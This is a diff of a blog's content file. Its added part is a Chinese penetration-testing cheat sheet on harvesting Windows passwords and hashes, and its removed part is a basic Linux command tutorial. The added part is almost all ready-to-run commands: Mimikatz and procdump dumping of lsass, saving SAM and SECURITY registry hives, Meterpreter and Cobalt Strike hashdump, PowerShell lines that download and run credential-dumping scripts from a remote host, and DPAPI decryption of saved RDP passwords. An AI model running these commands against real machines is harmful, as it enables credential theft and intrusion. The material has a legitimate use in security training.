+<h3 id="0x01-系统用户密码凭证获取"><a href="#0x01-系统用户密码凭证获取" class="headerlink" title="0x01 系统用户密码凭证获取"></a>0x01 系统用户密码凭证获取</h3><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
+<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+</blockquote>
+<h6 id="本地交互式"><a href="#本地交互式" class="headerlink" title="本地交互式"></a>本地交互式</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log res.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="本地非交互式凭证获取"><a href="#本地非交互式凭证获取" class="headerlink" title="本地非交互式凭证获取"></a>本地非交互式凭证获取</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log logon.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Powershell远程加载mimikatz脚本"><a href="#Powershell远程加载mimikatz脚本" class="headerlink" title="Powershell远程加载mimikatz脚本"></a>Powershell远程加载mimikatz脚本</h6><blockquote>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://ip:prot/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure>
+
+<h6 id="Powershell加载Get-PassHashes脚本"><a href="#Powershell加载Get-PassHashes脚本" class="headerlink" title="Powershell加载Get-PassHashes脚本"></a>Powershell加载Get-PassHashes脚本</h6><blockquote>
+<p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.x.x.<span class="number">85</span>/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<h4 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官网地址：https:<span class="regexp">//</span>www.ampliasecurity.com/research.html</span><br><span class="line"><span class="number">32</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x32.zip</span><br><span class="line"><span class="number">64</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x64.zip</span><br><span class="line">历史版本下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>windows-credentials-editor/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.jpg"></p>
+<h4 id="Pwddump7"><a href="#Pwddump7" class="headerlink" title="Pwddump7"></a>Pwddump7</h4><p>这款工具可以读取出当前系统的各个用户的密码hash (包括LM和NTLM)。 在命令行输入Pwddump7.txt就可以读取出hash并显示出来，也可以保存到一个文件中。</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Pwddump7</span>.</span></span>exe &gt; pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.jpg"></p>
+<h4 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h4><blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
+</blockquote>
+<p>Procdump lsass 进程导出: </p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> <span class="number">32</span>bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line"><span class="keyword">For</span> <span class="number">64</span>bits：</span><br><span class="line">procdump.exe -accepteula -<span class="number">64</span> -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>然后使用mimikatz还原密码：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h4><blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">system:system</span>.<span class="title">hiv</span> /<span class="title">sam:sam</span>.<span class="title">hiv</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
+
+<h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><blockquote>
+<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+</blockquote>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.jpg"></p>
+<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h6 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h6><p>获取system权限</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">meterpreter</span> &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
+
+<p>获取hash值</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump		//system权限的meterpreter</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit						//结果保存在tmp目录下</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h6 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; <span class="built_in">help</span> kiwi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#列举系统中的明文密码</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">#读取sam文件</span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">#kiwi_cmd命令后面接mimikatz.exe的命令</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-Hash解密"><a href="#0x02-Hash解密" class="headerlink" title="0x02  Hash解密"></a>0x02  Hash解密</h3><blockquote>
+<p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
+</blockquote>
+<h6 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h6><p>如果网站无法破解出hash值，可以使用ophcrack工具配合彩虹表破解。 </p>
+<p>工具下载：<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a> </p>
+<p>彩虹表： <a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a> <a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
+<h3 id="0x03-其他密码获取"><a href="#0x03-其他密码获取" class="headerlink" title="0x03  其他密码获取"></a>0x03  其他密码获取</h3><h4 id="获取RDP连接密码"><a href="#获取RDP连接密码" class="headerlink" title="获取RDP连接密码"></a>获取RDP连接密码</h4><h6 id="获取链接记录"><a href="#获取链接记录" class="headerlink" title="获取链接记录"></a>获取链接记录</h6><blockquote>
+<p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p>
+</blockquote>
+<h6 id="mimikatz解密"><a href="#mimikatz解密" class="headerlink" title="mimikatz解密"></a>mimikatz解密</h6><p>查看本地机器本地连接过的目标机器：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.jpg"></p>
+<p>查看本地用户此目录下是否存有RDP密码文件：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.jpg"></p>
+<p>查看保存在本地的远程主机信息：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+
+<p>选择一个密码文件对其进行解密：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br></pre></td></tr></table></figure>
+
+<p>此处需要记录下<code>guidMasterKey</code>的值，待会要通过<code>guidMasterKey</code>找对应的<code>Masterkey</code>。</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">guidMasterKey : &#123;<span class="number">56</span>dc62ge-<span class="number">0</span>af9-<span class="number">4925</span>-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据guidMasterKey找到对应的Masterkey：</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+
+<p>通过Masterkey解密pbData数据，拿到明文RDP连接密码：</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\2</span>A203AFB09B575A760E88FA341B9E354</span><br><span class="line">/masterkey:2d72835b9c08a9332106c23017ee6c0a0be9a368de34c1f6acc6d34dc0de8bc264729bd7736</span><br><span class="line">f806e9456544841564be0d5e9564090a7bb143ac32579adabb02a</span><br></pre></td></tr></table></figure>
+
+<h4 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h4><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问 数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。 </p>
+<p>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权 限后即可直接从数据库连接文件中读取 一般都包含有数据库类型，物理位置，用户名和密码等信息</p>
+<h5 id="MYSQL数据库文件类型"><a href="#MYSQL数据库文件类型" class="headerlink" title="MYSQL数据库文件类型"></a>MYSQL数据库文件类型</h5><p>MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件</p>
+<ul>
+<li>“.frm” 是描述表结构的文件 </li>
+<li>“.MYD” 是表的数据文件 </li>
+<li>“.MYI” 是表数据文件中任何索引的数据树</li>
+</ul>
+<p>与用户相关的一共有三个文件即user.frm、user.MYD、user.MYI，MYSQL数据库用户密码都保存在user.MYD 文件中，包括root用户和其他用户的密码</p>
+<h5 id="MYSQL加密方式"><a href="#MYSQL加密方式" class="headerlink" title="MYSQL加密方式"></a>MYSQL加密方式</h5><p>MYSQL数据库的认证密码有两种方式：</p>
+<ul>
+<li>MYSQL 4.1版本之前是MYSQL323加密 </li>
+<li>MYSQL 4.1和之后的版本都是MYSQLSHA1加密</li>
+</ul>
+<p>MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询， 前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中*是不加入实际的密 码运算中，MYSQLSHA1加密的密码的实际位数是40位</p>
+<h5 id="获取MYSQL密码"><a href="#获取MYSQL密码" class="headerlink" title="获取MYSQL密码"></a>获取MYSQL密码</h5><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.jpg"></p>
+<h5 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h5><ul>
+<li><a href="http://www.cmd5.com/">www.cmd5.com</a> </li>
+<li><a href="http://www.somd5.com/">www.somd5.com</a></li>
+</ul>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -1590,208 +2214,6 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       </tags>
   </entry>
   <entry>
-    <title>Linux基础命令-1</title>
-    <url>/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/</url>
-    <content><![CDATA[<h1 id="Linux基础命令（1）"><a href="#Linux基础命令（1）" class="headerlink" title="Linux基础命令（1）"></a>Linux基础命令（1）</h1><h5 id="成殇Orz"><a href="#成殇Orz" class="headerlink" title="成殇Orz"></a>成殇Orz</h5><h3 id="0x01-Linux介绍"><a href="#0x01-Linux介绍" class="headerlink" title="0x01 Linux介绍"></a>0x01 Linux介绍</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
-<span id="more"></span>
-
-<h3 id="0x02-Linux常用命令"><a href="#0x02-Linux常用命令" class="headerlink" title="0x02 Linux常用命令"></a>0x02 Linux常用命令</h3><h4 id="2-1-mkdir"><a href="#2-1-mkdir" class="headerlink" title="2.1 mkdir"></a>2.1 mkdir</h4><p><code>mkdir</code>命令用于创建目录。</p>
-<p>用法：<code>mkdir [选项] [目录名]</code></p>
-<p>参数：<code>-p</code> 创建多级目录，如果目录名称不存在，就新建一个。</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir CS</span><br><span class="line">mkdir CS1 CS2</span><br><span class="line">mkdir -p CS3/CS4</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/1.png"></p>
-<h4 id="2-2-ls"><a href="#2-2-ls" class="headerlink" title="2.2 ls"></a>2.2 ls</h4><p>命令用于显示指定工作目录下之内容（列出指定目录所含之文件及子目录)，<code>ls</code>命令的输出信息可以进行彩色加亮显示，以区分不同类型的文件。</p>
-<p>用法：<code>ls [选项] [目录]</code></p>
-<p>参数：</p>
-<ul>
-<li><code>-a</code> 显示所有文件及目录 (<strong>.</strong> 开头的隐藏文件也会列出)</li>
-<li><code>-l</code> 除文件名称外，也将文件型态、权限、拥有者、文件大小等资讯详细列出</li>
-<li><code>-h</code> 以容易理解的格式列出文件大小</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">ls -l</span><br><span class="line">ls -a CS3</span><br><span class="line">ls -al CS3</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/2.png"></p>
-<h4 id="2-3-pwd-命令"><a href="#2-3-pwd-命令" class="headerlink" title="2.3 pwd 命令"></a>2.3 pwd 命令</h4><p><code>pwd</code>命令以绝对路径的方式显示用户当前工作目录。命令将当前目录的全路径名称（从根目录）写入标准输出。全部目录使用/分隔。第一个/表示根目录，最后一个目录是当前目录。执行pwd命令得知目前所在的工作目录的绝对路径名称。</p>
-<p>用法：<code>pwd</code></p>
-<p>案例：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/3.png"></p>
-<h4 id="2-4-cd-命令"><a href="#2-4-cd-命令" class="headerlink" title="2.4 cd 命令"></a>2.4 cd 命令</h4><p><code>cd</code>命令用于切换当前工作目录。</p>
-<p>用法：<code>cd [目录]</code></p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> CS</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/4.png"></p>
-<p>用法：<code>cd [绝对路径]</code></p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/CS3/CS4</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/5.png"></p>
-<p>用法： <code>.</code>代表当前目录，<code>..</code>代表上一级目录，<code>cd ~</code>用于切换至登录用户家目录。<code>cd -</code>用于回到上一个目录。</p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> .</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/6.png"></p>
-<h4 id="2-5-touch-命令"><a href="#2-5-touch-命令" class="headerlink" title="2.5 touch 命令"></a>2.5 touch 命令</h4><p><code>touch</code>命令用于创建一个空白的新文件，如果同名文件已存在，则修改其时间属性。</p>
-<p>用法： <code>touch [选项] [文件名]</code></p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch SS</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/7.png"></p>
-<h4 id="2-6-cp-命令"><a href="#2-6-cp-命令" class="headerlink" title="2.6 cp 命令"></a>2.6 cp 命令</h4><p><code>cp</code>命令主要用于复制文件或目录。</p>
-<p>用法：<code>cp [选项] [源文件] [目录]</code></p>
-<p>参数：</p>
-<ul>
-<li><code>-r</code>：若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件。（递归）</li>
-<li><code>-p</code>：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。(保持默认属性)</li>
-</ul>
-<p>案例；</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp SS CS</span><br><span class="line">cp /root/<span class="built_in">test</span>/CS/SS CS1</span><br><span class="line">cp /root/<span class="built_in">test</span>/CS1/SS /root/<span class="built_in">test</span>/CS2</span><br><span class="line">cp -r CS2 CS3/CS4</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/8.png"></p>
-<h4 id="2-7-mv-命令"><a href="#2-7-mv-命令" class="headerlink" title="2.7 mv 命令"></a>2.7 mv 命令</h4><p><code>mv</code>命令用来为文件或目录改名、或将文件或目录移入其它位置。</p>
-<p>用法：<code>mv [选项] [源文件/源目录] [目录]</code> 参数：</p>
-<ul>
-<li><strong>-f</strong>: 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。（直接覆盖不询问）</li>
-<li><strong>-n</strong>: 不要覆盖任何已存在的文件或目录。(不覆盖已存在的文件)</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv SS S1</span><br><span class="line">mv S1 CS</span><br><span class="line">mv CS CS1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/9.png"></p>
-<p><code>mv</code>命令的另一种用法是将文件剪切。</p>
-<p><code>mv 路径/文件名 路径、文件名</code></p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mv</span> <span class="number">1</span>.txt /root</span><br><span class="line"><span class="attribute">mv</span> <span class="number">2</span>.txt /root/<span class="number">3</span>.txt</span><br><span class="line"><span class="attribute">mv</span> /root/<span class="number">2</span>.txt /root/<span class="number">1</span>/<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-8-rm命令"><a href="#2-8-rm命令" class="headerlink" title="2.8 rm命令"></a>2.8 rm命令</h4><p><code>rm</code>命令用于删除文件或者目录。</p>
-<p>用法：<code>rm [选项] [文件\目录]</code></p>
-<ul>
-<li>-i 删除前逐一询问确认。</li>
-<li>-f 即使原档案属性设为唯读，亦直接删除，无需逐一确认。</li>
-<li>-r 将目录及以下之档案亦逐一删除。</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm ss</span><br><span class="line">rm -f SS</span><br><span class="line">rm CS1/CS/      <span class="comment">#删除farmsec1/farmsec/目录下的所有文件</span></span><br><span class="line">rm -r farmsec1</span><br><span class="line">rm -rf farmsec2</span><br><span class="line">rm -rf /root/farmsec3</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/10.png"></p>
-<h6 id="注意：rm-rf是一条危险的命令，代表递归删除某文件，如rm-rf-是递归删除根目录下的所有目录和文件，该命令不会询问，一旦执行系统将崩溃。"><a href="#注意：rm-rf是一条危险的命令，代表递归删除某文件，如rm-rf-是递归删除根目录下的所有目录和文件，该命令不会询问，一旦执行系统将崩溃。" class="headerlink" title="注意：rm -rf是一条危险的命令，代表递归删除某文件，如rm -rf /是递归删除根目录下的所有目录和文件，该命令不会询问，一旦执行系统将崩溃。"></a>注意：<code>rm -rf</code>是一条危险的命令，代表递归删除某文件，如<code>rm -rf /</code>是递归删除根目录下的所有目录和文件，该命令不会询问，一旦执行系统将崩溃。</h6><h3 id="0x03-文本相关命令"><a href="#0x03-文本相关命令" class="headerlink" title="0x03 文本相关命令"></a>0x03 文本相关命令</h3><h4 id="3-1-cat-命令"><a href="#3-1-cat-命令" class="headerlink" title="3.1 cat 命令"></a>3.1 cat 命令</h4><p><code>cat</code>命令用于打开文件查看文件内容。</p>
-<p>用法：<code>cat [选项] [文件]</code></p>
-<p><code>cat -v [文件]</code>               #加入参数-v后再查看</p>
-<p>参数：</p>
-<ul>
-<li>-v：除了 LFD(换行) 和 TAB 之外所有控制符，用 ^ 和 M- 显示。</li>
-</ul>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/11.png"></p>
-<h4 id="3-2-echo-命令"><a href="#3-2-echo-命令" class="headerlink" title="3.2 echo 命令"></a>3.2 echo 命令</h4><p><code>echo</code>命令用于输出指定内容。</p>
-<p>用法：<code>echo &#39;[文本]&#39;</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/12.png"></p>
-<p>利用<code>&gt;&gt;</code>和<code>&gt;</code>也可以将输出内容写入到文件中。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;     <span class="comment">#为覆盖</span></span><br><span class="line">&gt;&gt;    <span class="comment">#为追加</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/13.png"></p>
-<p>使用<code>&gt;&gt;</code>和<code>&gt;</code>可以将命令的输出结果保存于文件中。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd &gt;1.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/14.png"></p>
-<h3 id="3-3-more-命令"><a href="#3-3-more-命令" class="headerlink" title="3.3 more 命令"></a>3.3 more 命令</h3><p><code>more</code> 命令类似 <code>cat</code> ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是，按空格键<code>Space</code>就往下一页显示，按<code>Enier</code>键显示文本的下一行内容,按 <code>b</code>键就会往回(back)一页显示，按<code>q</code>键退出。</p>
-<p>用法：<code>more [选项] [文件]</code></p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/05/13/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1/15.png"></p>
-<h3 id="3-4-less-命令"><a href="#3-4-less-命令" class="headerlink" title="3.4 less 命令"></a>3.4 less 命令</h3><p><code>less</code> 与more类似，用less命令显示文件时，用<code>PageUp</code>键向上翻页，用<code>PageDown</code>键向下翻页。要退出less程序按<code>q</code>键。</p>
-<p>用法：<code>less [选项] [文件]</code></p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-5-head-命令"><a href="#3-5-head-命令" class="headerlink" title="3.5 head 命令"></a>3.5 head 命令</h3><p><code>head</code>命令用于查看文件的开头的内容。在默认情况下，head命令显示文件的头10行内容</p>
-<p>用法：<code>head [选项] [文件]</code></p>
-<p>参数：</p>
-<ul>
-<li>-n&lt;行数&gt; 显示的行数</li>
-</ul>
-<p>案例：显示passwd文件前两行</p>
